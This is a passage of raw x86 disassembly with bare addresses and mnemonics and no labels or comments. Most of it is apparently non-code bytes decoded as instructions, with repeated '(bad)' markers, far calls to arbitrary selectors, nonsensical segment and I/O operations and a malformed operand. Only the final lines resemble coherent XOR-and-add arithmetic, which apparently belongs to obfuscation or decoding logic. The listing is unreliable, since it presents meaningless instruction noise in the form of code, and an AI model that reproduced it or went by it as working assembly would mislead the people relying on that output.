  415c74:	cvtpi2ps xmm0,QWORD PTR [eax-0x5d]
  415c78:	sar    BYTE PTR [ebx+eax*4],cl
  415c7b:	pop    edx
  415c7c:	jb     0x415cfb
  415c7e:	aas    
  415c7f:	daa    
  415c80:	inc    esi
  415c81:	xor    al,BYTE PTR [eax+ecx*4-0x7ea93823]
  415c88:	push   ebx
  415c89:	adc    al,0x72
  415c8b:	pop    edi
  415c8c:	cmc    
  415c8d:	or     BYTE PTR [esi-0x163f83a4],0x2e
  415c94:	or     ch,BYTE PTR [eax-0x80]
  415c97:	and    eax,0x41885951
  415c9c:	test   eax,0xc936210c
  415ca1:	xchg   BYTE PTR fs:0xbf1fb5fd,cl
  415ca8:	dec    ebx
  415ca9:	or     BYTE PTR [edx+0x62],0x2a
  415cad:	cmp    dl,BYTE PTR [edx-0x6bdb6508]
  415cb3:	mov    edi,0x748585e0
  415cb8:	push   ds
  415cb9:	xchg   ebp,eax
  415cba:	stc    
  415cbb:	xchg   ebp,eax
  415cbc:	cli    
  415cbd:	pop    esp
  415cbe:	mov    ss,ebp
  415cc0:	dec    ecx
  415cc1:	je     0x415cb9
  415cc3:	add    edx,DWORD PTR [ebx+ebx*1-0x59]
  415cc7:	cli    
  415cc8:	dec    esp
  415cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ccb:	mov    al,0xff
  415ccd:	mov    dl,0x69
  415ccf:	arpl   WORD PTR [eax],sp
  415cd1:	push   edx
  415cd2:	aaa    
  415cd3:	je     0x415d4e
  415cd5:	adc    edx,edi
  415cd7:	and    al,0xc9
  415cd9:	mov    al,ds:0x5029ced0
  415cde:	adc    ch,BYTE PTR [eax-0x5b072cc5]
  415ce4:	mov    ah,0xe1
  415ce6:	pop    es
  415ce7:	es pop es
  415ce9:	and    ecx,DWORD PTR [ecx]
  415ceb:	mov    dl,0xdd
  415ced:	aam    0x45
  415cef:	xor    eax,0x5396433b
  415cf4:	inc    eax
  415cf5:	pop    esi
  415cf6:	adc    al,0xac
  415cf8:	xor    DWORD PTR [edi],eax
  415cfa:	mov    edx,0xd7921f8e
  415cff:	xor    edx,esi
  415d01:	dec    eax
  415d02:	mov    ch,0x2a
  415d04:	cmp    eax,0x83993b16
  415d09:	xchg   esp,eax
  415d0a:	push   cs
  415d0b:	xchg   esp,eax
  415d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d0d:	or     ebx,DWORD PTR [eax-0x469c8e68]
  415d13:	dec    ecx
  415d14:	jl     0x415cf4
  415d16:	dec    ebp
  415d17:	or     esp,DWORD PTR [si+0x3d]
  415d1b:	mov    dl,0x87
  415d1d:	push   cs
  415d1e:	mov    edx,0x14824649
  415d23:	js     0x415d45
  415d25:	fwait
  415d26:	jnp    0x415da3
  415d28:	pop    es
  415d29:	es loop 0x415d5b
  415d2c:	and    al,0xcb
  415d2e:	in     eax,dx
  415d2f:	mov    eax,0x88a8b342
  415d34:	(bad)  
  415d35:	mov    al,ds:0x2392496d
  415d3a:	aam    0xdd
  415d3c:	and    esi,DWORD PTR ds:0xbcc61cc8
  415d42:	sub    eax,DWORD PTR [esi+0x74a5c2d8]
  415d48:	xchg   ebx,eax
  415d49:	mov    eax,ds:0x15b1b103
  415d4e:	mov    cl,0x0
  415d50:	aaa    
  415d51:	lods   al,BYTE PTR ds:[esi]
  415d52:	in     eax,0x6d
  415d54:	and    DWORD PTR [edi],esp
  415d56:	loopne 0x415daf
  415d58:	inc    esp
  415d59:	pop    ds
  415d5a:	push   ebp
  415d5b:	inc    esi
  415d5c:	dec    edx
  415d5d:	pop    esi
  415d5e:	retf   
  415d5f:	xor    BYTE PTR [ebx+0x5b],cl
  415d62:	sub    DWORD PTR [ebp-0x57d2705e],0xf29a6e5b
  415d6c:	cmp    BYTE PTR [eax-0x7135e0a6],ah
  415d72:	xor    eax,DWORD PTR [edx+ebp*4+0x34b2e1d3]
  415d79:	std    
  415d7a:	retf   0x86f3
  415d7d:	test   al,0xe0
  415d7f:	cld    
  415d80:	outs   dx,DWORD PTR ds:[esi]
  415d81:	xlat   BYTE PTR ds:[ebx]
  415d82:	adc    DWORD PTR [edi],edi
  415d84:	push   cs
  415d85:	rcl    DWORD PTR [edi-0x7],cl
  415d88:	mov    ebp,0xb8cef8c
  415d8d:	pop    DWORD PTR [edi-0x28]
  415d90:	sbb    BYTE PTR [eax-0x214f11c5],bh
  415d96:	xchg   esp,eax
  415d97:	cli    
  415d98:	in     eax,dx
  415d99:	sar    DWORD PTR [esi],1
  415d9b:	iret   
  415d9c:	push   edi
  415d9d:	mov    ch,bl
  415d9f:	stos   DWORD PTR es:[edi],eax
  415da0:	cli    
  415da1:	fst    DWORD PTR [esi-0x354da160]
  415da7:	dec    edx
  415da8:	sub    BYTE PTR [ecx],bh
  415daa:	dec    esp
  415dab:	jae    0x415e20
  415dad:	mov    edx,0x5386dc4f
  415db2:	out    dx,al
  415db3:	xchg   bh,al
  415db5:	enter  0xf4f4,0x3
  415db9:	imul   esi,DWORD PTR [esi-0x27d6d64f],0xffffffb4
  415dc0:	rcr    BYTE PTR [esi],0x4a
  415dc3:	inc    ecx
  415dc4:	mov    dl,0x82
  415dc6:	into   
  415dc7:	jbe    0x415d8a
  415dc9:	mov    edx,ebp
  415dcb:	mov    ecx,0xdf55923b
  415dd0:	scas   al,BYTE PTR es:[edi]
  415dd1:	loopne 0x415d60
  415dd3:	lods   al,BYTE PTR ds:[esi]
  415dd4:	and    al,0x8
  415dd6:	addr16 xchg edi,eax
  415dd8:	mov    edi,ss
  415dda:	shr    DWORD PTR [esi],cl
  415ddc:	jbe    0x415dc2
  415dde:	sbb    esi,esp
  415de0:	lds    edx,FWORD PTR [esi-0x58]
  415de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de4:	dec    esi
  415de5:	dec    eax
  415de6:	ret    0xa057
  415de9:	call   0x803c:0x730eb30c
  415df0:	inc    eax
  415df1:	xchg   edx,eax
  415df2:	pop    ds
  415df3:	sbb    BYTE PTR [esp+edx*1],dl
  415df6:	push   ds
  415df7:	xchg   esi,eax
  415df8:	pop    esp
  415df9:	cld    
  415dfa:	(bad)  
  415dfb:	in     al,0x2f
  415dfd:	sti    
  415dfe:	push   cs
  415dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e00:	push   esi
  415e01:	mov    WORD PTR [esi],cs
  415e03:	or     DWORD PTR ds:0x41172dc9,ecx
  415e09:	push   eax
  415e0a:	add    eax,0x664d77a6
  415e0f:	call   0x435e137
  415e14:	mov    ch,0x3
  415e16:	mov    eax,0x51defe2e
  415e1b:	and    al,al
  415e1d:	rcr    edx,1
  415e1f:	stos   DWORD PTR es:[edi],eax
  415e20:	pop    ds
  415e21:	lds    ebx,FWORD PTR [eax]
  415e23:	in     al,0x5a
  415e25:	aas    
  415e26:	addr16 cld 
  415e28:	dec    ebp
  415e29:	sub    eax,0x826248ef
  415e2e:	lock sub edx,DWORD PTR [eax+ebp*2+0x1063bd88]
  415e36:	or     DWORD PTR [edx],ebp
  415e38:	psllw  mm6,mm2
  415e3b:	push   ebp
  415e3c:	(bad)  
  415e3d:	retf   
  415e3e:	ret    0xd1ef
  415e41:	repnz pusha 
  415e43:	jbe    0x415e29
  415e45:	std    
  415e46:	in     eax,dx
  415e47:	ret    0x2ab9
  415e4a:	inc    esp
  415e4b:	lea    esp,[edx+0x27d58864]
  415e51:	jp     0x415e86
  415e53:	call   0xb2bc12d8
  415e58:	fsubrp st(3),st
  415e5a:	std    
  415e5b:	pop    es
  415e5c:	int    0xdf
  415e5e:	cmp    al,0x14
  415e60:	add    ebp,DWORD PTR [edi-0x19c071b9]
  415e66:	into   
  415e67:	loop   0x415ea4
  415e69:	pop    ebp
  415e6a:	cmp    BYTE PTR [ebp+0x738f7ee6],al
  415e70:	enter  0x7e2b,0x85
  415e74:	inc    ecx
  415e75:	into   
  415e76:	cwde   
  415e77:	mov    dl,0xc9
  415e79:	ret    
  415e7a:	ficom  WORD PTR [edx+0x1c]
  415e7d:	stc    
  415e7e:	(bad)  
  415e7f:	out    dx,al
  415e80:	mov    edx,DWORD PTR [eax+ecx*1+0x786d78de]
  415e87:	mov    ds:0x75a346b3,al
  415e8c:	mov    cl,0x52
  415e8e:	xchg   DWORD PTR [esi-0x15],esi
  415e91:	xor    DWORD PTR [eax],edi
  415e93:	mov    ch,0x9b
  415e95:	(bad)  
  415e96:	mov    al,ds:0xd273172e
  415e9b:	ins    BYTE PTR es:[edi],dx
  415e9c:	dec    esi
  415e9d:	retf   
  415e9e:	add    dh,ah
  415ea0:	das    
  415ea1:	mov    bl,0x2e
  415ea3:	push   ecx
  415ea4:	jbe    0x415eb4
  415ea6:	popa   
  415ea7:	jb     0x415ec3
  415ea9:	ret    0xc8bd
  415eac:	push   es
  415ead:	push   cs
  415eae:	addr16 sahf 
  415eb0:	fs mov eax,0xa118f351
  415eb6:	cmp    ch,bh
  415eb8:	pop    ds
  415eb9:	sub    ebx,ebx
  415ebb:	shl    BYTE PTR [ecx+0x318771c6],cl
  415ec1:	test   BYTE PTR [edx+0x68],ah
  415ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec5:	pop    ss
  415ec6:	xlat   BYTE PTR ds:[ebx]
  415ec7:	adc    cl,ch
  415ec9:	lods   eax,DWORD PTR ds:[esi]
  415eca:	sbb    al,BYTE PTR [edx]
  415ecc:	dec    esi
  415ecd:	out    dx,eax
  415ece:	sbb    al,0xf0
  415ed0:	cmp    dl,BYTE PTR [eax*2-0x3a3db2a5]
  415ed7:	ret    0xeb1d
  415eda:	or     DWORD PTR [edx+0x4e2fbc1a],ecx
  415ee0:	xchg   esp,eax
  415ee1:	inc    edi
  415ee2:	cmp    bh,BYTE PTR [ebp+0x516d286]
  415ee8:	retf   
  415ee9:	xchg   ebx,eax
  415eea:	mov    dh,BYTE PTR [edx]
  415eec:	mov    dh,0x7a
  415eee:	mov    DWORD PTR [ebx+ebp*2-0x4d1e4452],eax
  415ef5:	or     al,0xcb
  415ef7:	and    dh,BYTE PTR [eax]
  415ef9:	sbb    eax,0xc3cf375a
  415efe:	imul   edi,DWORD PTR [edi-0x13],0xc7e86074
  415f05:	adc    al,0x15
  415f07:	fs xchg edi,eax
  415f09:	or     al,0x68
  415f0b:	not    DWORD PTR [eax-0x4d]
  415f0e:	sub    DWORD PTR [eax],eax
  415f10:	push   edx
  415f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f12:	mov    BYTE PTR [ebx],dh
  415f14:	pop    ebp
  415f15:	jne    0x415f04
  415f17:	jmp    0xcb2f:0x9641f6b
  415f1e:	or     al,0x4b
  415f20:	inc    eax
  415f21:	cmp    cl,ch
  415f23:	aam    0xa6
  415f25:	hlt    
  415f26:	xor    ecx,DWORD PTR [ebx]
  415f28:	js     0x415f02
  415f2a:	xchg   DWORD PTR [edi-0x5d],ebp
  415f2d:	push   ecx
  415f2e:	call   0x921ac0d5
  415f33:	pop    ecx
  415f34:	adc    al,0x65
  415f36:	int    0x74
  415f38:	pop    ds
  415f39:	pop    eax
  415f3a:	addr16 xchg esp,eax
  415f3c:	sar    BYTE PTR [ecx-0x294b5e13],cl
  415f42:	test   BYTE PTR cs:[edx-0x14],dl
  415f46:	lods   eax,DWORD PTR ds:[esi]
  415f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f48:	dec    edi
  415f49:	sub    eax,0x639983e9
  415f4e:	mov    edi,0xea4ed884
  415f53:	xchg   edi,esp
  415f55:	cmp    eax,0xf834a75c
  415f5a:	ror    DWORD PTR [edi],1
  415f5c:	jecxz  0x415f49
  415f5e:	aaa    
  415f5f:	std    
  415f60:	sub    eax,0x233cad23
  415f65:	push   es
  415f66:	push   edx
  415f67:	lods   eax,DWORD PTR ds:[esi]
  415f68:	and    al,0x51
  415f6a:	and    DWORD PTR [ecx+ebx*2-0x2a],edx
  415f6e:	dec    ebx
  415f6f:	xor    al,0x3b
  415f71:	pop    edi
  415f72:	cmp    eax,0x8135e84e
  415f77:	cmp    al,0xb1
  415f79:	outs   dx,BYTE PTR ds:[esi]
  415f7a:	push   ebp
  415f7b:	push   esi
  415f7c:	cld    
  415f7d:	daa    
  415f7e:	dec    eax
  415f7f:	jns    0x415f50
  415f81:	add    dl,BYTE PTR [ebp+0xa62490b]
  415f87:	push   ds
  415f88:	les    eax,FWORD PTR [ecx-0x7c]
  415f8b:	dec    ebp
  415f8c:	push   edx
  415f8d:	mov    cs,WORD PTR [ecx-0x55]
  415f90:	je     0x415ff8
  415f92:	and    eax,0x838bbdbd
  415f97:	mov    edx,0x8722dda9
  415f9c:	loop   0x416013
  415f9e:	outs   dx,BYTE PTR ds:[esi]
  415f9f:	iret   
  415fa0:	daa    
  415fa1:	out    0xb0,eax
  415fa3:	lods   eax,DWORD PTR ds:[esi]
  415fa4:	lea    esi,[esi+0x494dd346]
  415faa:	cmc    
  415fab:	pop    ebp
  415fac:	cmp    al,0x81
  415fae:	xchg   BYTE PTR [bx+di-0x1588],al
  415fb3:	xchg   ebx,eax
  415fb4:	push   eax
  415fb5:	popa   
  415fb6:	pop    ebp
  415fb7:	lods   al,BYTE PTR ds:[esi]
  415fb8:	mov    cl,0xd3
  415fba:	sbb    ch,BYTE PTR [edi]
  415fbc:	and    ah,BYTE PTR [esi-0x290a9782]
  415fc2:	nop
  415fc3:	push   edx
  415fc4:	iret   
  415fc5:	mov    al,0x26
  415fc7:	stos   BYTE PTR es:[edi],al
  415fc8:	pop    ebp
  415fc9:	lods   eax,DWORD PTR ds:[esi]
  415fca:	xor    al,0x69
  415fcc:	pop    ss
  415fcd:	inc    edx
  415fce:	jmp    0x8f58a437
  415fd3:	mov    ?,WORD PTR [eax+ebp*4]
  415fd6:	aas    
  415fd7:	mov    dh,BYTE PTR [ebx+0x158b8379]
  415fdd:	mov    ds:0x8aee3617,eax
  415fe2:	bound  edi,QWORD PTR [ebp-0xf]
  415fe5:	cdq    
  415fe6:	sbb    edi,DWORD PTR [esi+eax*4+0x1d]
  415fea:	out    dx,eax
  415feb:	cld    
  415fec:	jmp    eax
  415fee:	push   edx
  415fef:	popa   
  415ff0:	inc    edi
  415ff1:	inc    edx
  415ff2:	std    
  415ff3:	xor    ah,cl
  415ff5:	ds xchg edx,eax
  415ff7:	fwait
  415ff8:	xchg   ecx,ebp
  415ffa:	cmp    ecx,DWORD PTR [esi+0x1c]
  415ffd:	fidivr DWORD PTR [ecx]
  415fff:	imul   edi,DWORD PTR [esi],0xcc638917
  416005:	inc    ecx
  416006:	loop   0x415fa8
  416008:	(bad)  
  416009:	data16 xor BYTE PTR [ebx+edi*2+0x50],dl
  41600e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600f:	xchg   edx,eax
  416010:	mov    bl,ch
  416012:	stos   DWORD PTR es:[edi],eax
  416013:	fwait
  416014:	jnp    0x416090
  416016:	int    0x3b
  416018:	add    DWORD PTR [ecx+0x2],ebp
  41601b:	fiadd  DWORD PTR [esi+0x6c]
  41601e:	lea    ebx,ds:0xe0c3b2c9
  416024:	lock shr DWORD PTR [eax+0x6a5bacba],cl
  41602b:	fcom   QWORD PTR [edi-0x3161d97]
  416031:	retf   0x2660
  416034:	xor    BYTE PTR [edx-0xce2aa98],cl
  41603a:	dec    esi
  41603b:	lods   al,BYTE PTR ds:[esi]
  41603c:	out    dx,eax
  41603d:	shl    BYTE PTR [ecx],0xb8
  416040:	pop    esp
  416041:	xchg   esi,eax
  416042:	push   ebp
  416043:	pop    edx
  416044:	mov    ss,ebx
  416046:	add    eax,DWORD PTR [ebx-0x13e72b13]
  41604c:	aad    0x65
  41604e:	mov    al,ds:0xf9f99e35
  416053:	rcr    dh,1
  416055:	jno    0x416039
  416057:	or     eax,0x135e816f
  41605c:	lods   al,BYTE PTR ds:[esi]
  41605d:	jmp    0x4eb6:0xd3b1c44
  416064:	mov    BYTE PTR [ecx-0x1df7c2d7],dh
  41606a:	ins    BYTE PTR es:[edi],dx
  41606b:	sub    DWORD PTR [esp+eax*1+0xb],eax
  41606f:	jmp    0x416074
  416071:	sbb    bh,BYTE PTR [eax]
  416073:	push   eax
  416074:	mov    bh,0x9c
  416076:	jae    0x41605d
  416078:	adc    al,0x59
  41607a:	call   DWORD PTR [esi-0x3d]
  41607d:	xlat   BYTE PTR ds:[ebx]
  41607e:	xor    ch,BYTE PTR [esi+eax*1+0x464d01ea]
  416085:	jp     0x41603a
  416087:	stos   BYTE PTR es:[edi],al
  416088:	ret    
  416089:	cmp    DWORD PTR [edi],ebx
  41608b:	call   0xf9130b35
  416090:	pop    ds
  416091:	cmp    DWORD PTR [edi-0xc2ff733],eax
  416097:	stos   BYTE PTR es:[edi],al
  416098:	and    BYTE PTR [ebp+eax*8+0x2853a681],al
  41609f:	mov    ecx,0x663c51c5
  4160a4:	scas   al,BYTE PTR es:[edi]
  4160a5:	mov    esp,0x6b4708a4
  4160aa:	mov    ds:0x5d07caa0,al
  4160af:	mov    cl,0x96
  4160b1:	sbb    eax,0x769dfdc3
  4160b6:	mov    ecx,0x89e5354c
  4160bb:	(bad)  
  4160bc:	xchg   ecx,eax
  4160bd:	mov    dh,0x7a
  4160bf:	cmp    ch,cl
  4160c1:	jp     0x4160e2
  4160c3:	add    bh,BYTE PTR [ebx-0x46]
  4160c6:	ror    DWORD PTR ds:0x69935887,cl
  4160cc:	inc    ecx
  4160cd:	gs jns 0x41609c
  4160d0:	jno    0x416056
  4160d2:	jg     0x4160ea
  4160d4:	and    eax,0x5606e9e6
  4160d9:	ja     0x4160b4
  4160db:	cli    
  4160dc:	cdq    
  4160dd:	test   eax,0xe2d1c610
  4160e2:	gs idiv ch
  4160e5:	jae    0x4160cb
  4160e7:	xor    eax,0x24030c00
  4160ec:	cmp    bh,BYTE PTR [esi-0x5c]
  4160ef:	jg     0x4160b4
  4160f1:	test   BYTE PTR [ebp-0x33],0xc2
  4160f5:	test   al,0x2e
  4160f7:	popf   
  4160f8:	xor    eax,0xf1305c72
  4160fd:	xor    eax,0xe3e22691
  416102:	repz js 0x4160fd
  416105:	cwde   
  416106:	and    ebx,ebx
  416108:	inc    ecx
  416109:	adc    al,0x68
  41610b:	fcomp  DWORD PTR [eax+0x68]
  41610e:	sbb    al,0x5f
  416110:	mov    ebx,0xae60b4e5
  416115:	rcr    DWORD PTR [edx],0x7c
  416118:	test   eax,0xfcc18ca6
  41611d:	sub    cl,BYTE PTR [edx+esi*2]
  416120:	sbb    al,0x34
  416122:	inc    esi
  416123:	xor    DWORD PTR [eax],0x5765ad35
  416129:	mov    dh,0x6e
  41612b:	mov    dh,0xe2
  41612d:	lahf   
  41612e:	push   ss
  41612f:	jae    0x416100
  416131:	je     0x6a8d47aa
  416137:	pop    DWORD PTR [eax-0x1f]
  41613a:	fisttp QWORD PTR [ebp+0x8e9f050]
  416140:	fucomp st(4)
  416142:	mov    DWORD PTR ds:0xc89bc4a4,edi
  416148:	dec    ebp
  416149:	inc    ebp
  41614a:	or     al,0x6a
  41614c:	push   es
  41614d:	daa    
  41614e:	or     BYTE PTR [esi-0x57b90b07],dl
  416154:	(bad)  
  416155:	fstp   QWORD PTR [ebx+0x133a95b7]
  41615b:	fmul   QWORD PTR [esi+0x8027ca8]
  416161:	pop    eax
  416162:	inc    ebx
  416163:	ret    0x771e
  416166:	push   ebx
  416167:	pop    ebp
  416168:	arpl   WORD PTR [ebx-0x7],di
  41616b:	jbe    0x416144
  41616d:	mov    bl,0x2d
  41616f:	ret    
  416170:	adc    dl,BYTE PTR [ecx]
  416172:	pop    eax
  416173:	or     BYTE PTR [edx-0x7e],0x8f
  416177:	mov    ds:0x7b35deff,eax
  41617c:	mov    dl,cl
  41617e:	jb     0x4161a1
  416180:	jg     0x416191
  416182:	aad    0xdc
  416184:	rcl    DWORD PTR [esi+0x57d6841c],1
  41618a:	jl     0x416198
  41618c:	loopne 0x41618d
  41618e:	stc    
  41618f:	mov    cl,BYTE PTR [ecx-0x2]
  416192:	aam    0x65
  416194:	adc    BYTE PTR [ecx+0x63b3bbac],ah
  41619a:	lahf   
  41619b:	jl     0x4161f6
  41619d:	inc    ebp
  41619e:	ret    
  41619f:	xlat   BYTE PTR ds:[ebx]
  4161a0:	fsubr  QWORD PTR [edi]
  4161a2:	aad    0x9e
  4161a4:	sbb    DWORD PTR [edx+0x6467e111],0x23
  4161ab:	pop    esp
  4161ac:	(bad)  
  4161ad:	shr    BYTE PTR [ebx-0x78],cl
  4161b0:	mov    ebp,0x9c2dc78f
  4161b5:	push   edi
  4161b6:	fistp  DWORD PTR [edx-0x7b20e3f8]
  4161bc:	jp     0x416196
  4161be:	loop   0x41614a
  4161c0:	xlat   BYTE PTR ds:[ebx]
  4161c1:	pusha  
  4161c2:	out    dx,al
  4161c3:	cmp    dh,BYTE PTR [edi-0x7e]
  4161c6:	xchg   esi,eax
  4161c7:	cmp    bl,ah
  4161c9:	xchg   esi,eax
  4161ca:	jbe    0x41617f
  4161cc:	jo     0x416183
  4161ce:	xchg   edi,eax
  4161cf:	mov    ebx,DWORD PTR [ebx]
  4161d1:	lahf   
  4161d2:	and    ecx,DWORD PTR [ecx+ebx*1-0x14bd9753]
  4161d9:	inc    ebx
  4161da:	int    0xbb
  4161dc:	fs inc ebx
  4161de:	retf   
  4161df:	jb     0x41625c
  4161e1:	retf   
  4161e2:	ja     0x41622e
  4161e4:	adc    esi,edi
  4161e6:	aam    0x2e
  4161e8:	sub    al,0x41
  4161ea:	add    esp,esp
  4161ec:	pop    es
  4161ed:	push   ecx
  4161ee:	jb     0x4161dc
  4161f0:	sti    
  4161f1:	mov    bh,0xee
  4161f3:	jno    0x4161d6
  4161f5:	inc    edi
  4161f6:	out    dx,eax
  4161f7:	(bad)  
  4161f8:	jb     0x416272
  4161fa:	dec    edx
  4161fb:	out    0xfc,eax
  4161fd:	xchg   BYTE PTR [eax],dh
  4161ff:	enter  0x7103,0x85
  416203:	xchg   esp,eax
  416204:	jecxz  0x416211
  416206:	inc    edx
  416207:	neg    BYTE PTR [ebx-0x2567ce7c]
  41620d:	ret    
  41620e:	pop    ss
  41620f:	add    dl,0x98
  416212:	and    eax,0xe34a9bab
  416217:	mov    edx,DWORD PTR [esi]
  416219:	inc    ebx
  41621a:	pop    ebp
  41621b:	inc    ebx
  41621c:	or     BYTE PTR [ebp-0x73],dh
  41621f:	loop   0x416252
  416221:	inc    edi
  416222:	xchg   edi,eax
  416223:	or     eax,0xa61295d8
  416228:	ss add al,0x7c
  41622b:	cdq    
  41622c:	ins    DWORD PTR es:[edi],dx
  41622d:	repnz pop es
  41622f:	cli    
  416230:	loopne 0x41624c
  416232:	xchg   ah,bl
  416234:	mov    eax,0xfae2df03
  416239:	push   eax
  41623a:	mov    al,cl
  41623c:	mov    edi,0x226d922d
  416241:	push   eax
  416242:	adc    esp,DWORD PTR [edi]
  416244:	ins    BYTE PTR es:[edi],dx
  416245:	aad    0x8b
  416247:	mov    bl,0xb8
  416249:	mov    edi,0xddef97dc
  41624e:	xchg   ebx,esi
  416250:	cmp    eax,0xb714103e
  416255:	push   eax
  416256:	in     eax,dx
  416257:	(bad)  
  416259:	lahf   
  41625a:	gs je  0x4162d4
  41625d:	nop
  41625e:	xor    dl,0x45
  416261:	push   ebp
  416262:	xlat   BYTE PTR ds:[ebx]
  416263:	retf   0xc2b2
  416266:	inc    edx
  416267:	dec    ebp
  416268:	cmc    
  416269:	sbb    dl,BYTE PTR ds:0x1177ba66
  41626f:	xor    dh,BYTE PTR [eax]
  416271:	mov    cl,0x60
  416273:	xor    DWORD PTR [eax],ebx
  416275:	repnz adc edi,DWORD PTR [edx-0x42dc8fc]
  41627c:	inc    edi
  41627d:	in     al,0x24
  41627f:	mov    edi,0xff297e7e
  416284:	cwde   
  416285:	lock rcl DWORD PTR [ecx],1
  416288:	aas    
  416289:	jge    0x4162a9
  41628b:	pop    esi
  41628c:	shl    BYTE PTR [ecx-0x25],cl
  41628f:	in     eax,dx
  416290:	pop    edx
  416291:	nop
  416292:	repz cmp eax,0xc7d7cd49
  416298:	les    edx,FWORD PTR [ecx+0x23]
  41629b:	in     eax,dx
  41629c:	cwde   
  41629d:	pop    ds
  41629e:	addr16 or ah,bh
  4162a1:	shl    DWORD PTR [eax+eax*8-0x7546d00e],1
  4162a8:	test   BYTE PTR [ecx],dl
  4162aa:	addr16 lahf 
  4162ac:	les    ebp,FWORD PTR ds:0xd70fbe20
  4162b2:	or     BYTE PTR [eax+0x18],ah
  4162b5:	pusha  
  4162b6:	cmp    al,0xfb
  4162b8:	mov    dh,0xe7
  4162ba:	push   edi
  4162bb:	mov    ds:0xb3d1abc8,eax
  4162c0:	mov    ah,0x95
  4162c2:	iret   
  4162c3:	xchg   BYTE PTR [edx],ah
  4162c5:	push   esp
  4162c6:	add    ah,ch
  4162c8:	jg     0x416304
  4162ca:	loop   0x416302
  4162cc:	cmc    
  4162cd:	into   
  4162ce:	imul   edi,DWORD PTR [ecx+0x26],0xfffffff1
  4162d2:	inc    edx
  4162d3:	fild   WORD PTR [edi+0x30]
  4162d6:	pop    ds
  4162d7:	dec    ebp
  4162d8:	ss add esp,ebx
  4162db:	adc    al,0x50
  4162dd:	mov    ecx,0x4c7610f8
  4162e2:	pop    ds
  4162e3:	retf   
  4162e4:	repz clc 
  4162e6:	in     eax,0xb4
  4162e8:	inc    ebx
  4162e9:	mov    ds:0xf6cf5a83,eax
  4162ee:	or     bh,BYTE PTR [edi+ebp*8]
  4162f1:	pop    ecx
  4162f2:	sbb    eax,0xdc499b49
  4162f7:	js     0x416301
  4162f9:	or     eax,0x4469fbbc
  4162fe:	mov    esp,0xa89c13ca
  416303:	test   ah,al
  416305:	adc    edx,0x3bfff9b5
  41630b:	mov    ds:0xc82e7e36,al
  416310:	jno    0x416359
  416312:	sar    BYTE PTR [eax-0x6f],cl
  416315:	daa    
  416316:	mov    esp,0xbfbb7d7e
  41631b:	push   ds
  41631c:	out    dx,al
  41631d:	push   es
  41631e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631f:	jb     0x41632b
  416321:	fwait
  416322:	imul   esp,DWORD PTR [esi+eiz*2-0x6420158f],0x34b924d8
  41632d:	jno    0x41637b
  41632f:	shl    dl,0x9
  416332:	cdq    
  416333:	fwait
  416334:	jl     0x4162f5
  416336:	repz pop ecx
  416338:	inc    ebx
  416339:	stos   DWORD PTR es:[edi],eax
  41633a:	jb     0x416307
  41633c:	push   es
  41633d:	mov    ds:0x54c08b13,eax
  416342:	dec    edx
  416343:	(bad)  
  416345:	clc    
  416346:	dec    esi
  416347:	pop    es
  416348:	lods   al,BYTE PTR ds:[esi]
  416349:	(bad)  
  41634a:	adc    eax,0xe0a69215
  41634f:	mov    ch,0x9d
  416351:	stos   BYTE PTR es:[edi],al
  416352:	sbb    dh,BYTE PTR [esi+0x21]
  416355:	ins    BYTE PTR es:[edi],dx
  416356:	call   0xc504:0x97ee3ca4
  41635d:	clc    
  41635e:	or     BYTE PTR [edx],al
  416360:	mov    esi,0x46dc5a43
  416365:	jecxz  0x416382
  416367:	retf   0xb1b3
  41636a:	test   DWORD PTR [edi],esi
  41636c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636d:	xchg   esp,eax
  41636e:	and    eax,0x363ff55d
  416373:	mov    ch,0xfb
  416375:	gs xchg ebx,eax
  416377:	retf   0x8662
  41637a:	mov    ecx,0x7eebdd5b
  41637f:	(bad)  
  416380:	jmp    FWORD PTR [esi]
  416382:	call   0xe3c4:0xcde69f15
  416389:	mov    ds:0x88206b45,al
  41638e:	inc    ecx
  41638f:	adc    BYTE PTR [ebp+0xc],bl
  416392:	test   ah,bh
  416394:	adc    eax,0x9cf83892
  416399:	ins    DWORD PTR es:[edi],dx
  41639a:	push   ss
  41639b:	test   DWORD PTR [ebx+0xd1ca7e8],eax
  4163a1:	sbb    eax,DWORD PTR [ecx-0x6c06ab36]
  4163a7:	sahf   
  4163a8:	mov    bl,0x6b
  4163aa:	movmskps ebx,xmm1
  4163ad:	and    BYTE PTR [edi+0xfdd1f0c],cl
  4163b3:	pop    ecx
  4163b4:	popf   
  4163b5:	xor    DWORD PTR [ebx],ebp
  4163b7:	fiadd  DWORD PTR [ebx]
  4163b9:	pop    ebp
  4163ba:	mov    esp,0x8bbc5d89
  4163bf:	push   ebp
  4163c0:	or     BYTE PTR [ebx],dh
  4163c2:	rol    BYTE PTR [ebx],1
  4163c4:	(bad)  
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
